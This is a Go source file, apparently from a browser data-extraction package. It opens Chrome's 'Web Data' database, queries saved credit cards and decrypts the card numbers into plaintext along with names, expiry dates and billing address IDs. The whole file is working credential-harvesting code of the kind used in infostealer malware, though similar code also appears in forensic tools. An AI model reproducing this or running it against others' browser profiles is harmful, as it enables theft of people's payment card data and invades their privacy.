package browsers

import (
	"fmt"
	"log"
	"os"
	"path/filepath"
)

// CreditCard represents a user's credit card information.
type CreditCard struct {
	Name            string
	ExpirationYear  string
	ExpirationMonth string
	Address         string
	Number          string
}

// GetCreditCards fetches saved credit cards from Chrome's "Web Data" SQLite database.
func (c *Chromium) GetCreditCards(path string) (creditCards []CreditCard, err error) {
	// Ensure that the "Web Data" file exists
	webDataPath := filepath.Join(path, "Web Data")

	// Debugging: Print the constructed path
	fmt.Println("Trying to open database at:", webDataPath)

	// Check if the "Web Data" file exists
	if _, err := os.Stat(webDataPath); os.IsNotExist(err) {
		return nil, fmt.Errorf("database file does not exist: %s", webDataPath)
	}

	// Open the database connection to the "Web Data" SQLite file
	db, err := GetDBConnection(webDataPath)
	if err != nil {
		return nil, fmt.Errorf("failed to open database connection: %v", err)
	}
	defer db.Close()

	// Query to fetch credit card data from the database
	rows, err := db.Query("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, billing_address_id FROM credit_cards")
	if err != nil {
		return nil, fmt.Errorf("failed to query credit cards: %v", err)
	}
	defer rows.Close()

	// Loop through the rows to extract credit card information
	for rows.Next() {
		var (
			name, month, year, address string
			encryptValue               []byte
		)

		// Scan the row into variables
		if err := rows.Scan(&name, &month, &year, &encryptValue, &address); err != nil {
			log.Printf("error scanning row: %v", err) // Log any errors with scanning
			continue
		}

		// Skip empty entries or rows with missing data
		if month == "" || year == "" || encryptValue == nil {
			continue
		}

		// Decrypt the encrypted card number
		value, err := c.Decrypt(encryptValue)
		if err != nil {
			log.Printf("error decrypting card: %v", err) // Log any errors with decryption
			continue
		}

		// Add the credit card information to the list
		creditCard := CreditCard{
			Name:            name,
			ExpirationYear:  year,
			ExpirationMonth: month,
			Address:         address,
			Number:          string(value),
		}

		creditCards = append(creditCards, creditCard)
	}

	// Check for errors encountered while iterating over rows
	if err := rows.Err(); err != nil {
		return nil, fmt.Errorf("error iterating over rows: %v", err)
	}

	return creditCards, nil
}
